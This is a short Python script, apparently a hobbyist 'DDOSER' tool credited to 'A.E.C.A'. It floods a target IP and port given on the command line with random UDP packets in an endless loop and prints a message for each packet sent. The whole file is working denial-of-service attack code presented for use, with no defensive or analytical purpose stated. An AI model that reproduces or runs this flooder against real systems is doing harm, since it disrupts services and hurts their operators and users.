import socket
import random
import argparse
import os 

class DDOSER:

	def __init__(self,ip,port,bytes_count):

		self.ip = ip 
		self.port = port 
		self.bytes_count = bytes_count


	def make_options(self):

		self.conn = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		self.attack = random._urandom(self.bytes_count)

	def start_DDOS(self):
		os.system("clear")
		banner = """
	 _______     _______     _______     _______ 
	(  ___  )   (  ____ \   (  ____ \   (  ___  )
	| (   ) |   | (    \/   | (    \/   | (   ) |
	| (___) |   | (__       | |         | (___) |
	|  ___  |   |  __)      | |         |  ___  |
	| (   ) |   | (         | |         | (   ) |
	| )   ( | _ | (____/\ _ | (____/\ _ | )   ( |
	|/     \|(_)(_______/(_)(_______/(_)|/     \|
	                                             
	       made by Trippingcarpet for A.E.C.A
	"""

		print(banner)

		self.make_options()

		while True:
			self.conn.sendto(self.attack,(self.ip,self.port))
			print("[!]Sending PACKETS TO: {}".format(self.ip))



if __name__ == "__main__":
	
	parser = argparse.ArgumentParser(description = "DDOSER BY A.E.C.A")
	parser.add_argument("ip",help="Target ip")
	parser.add_argument("port",help="Target open port")
	parser.add_argument("bytes",help="Bytes size")
	args = parser.parse_args()

	target_ip = str(args.ip)
	target_open_port = int(args.port)
	bytes_count = int(args.bytes)

	me = DDOSER(target_ip,target_open_port,bytes_count)
	me.start_DDOS()
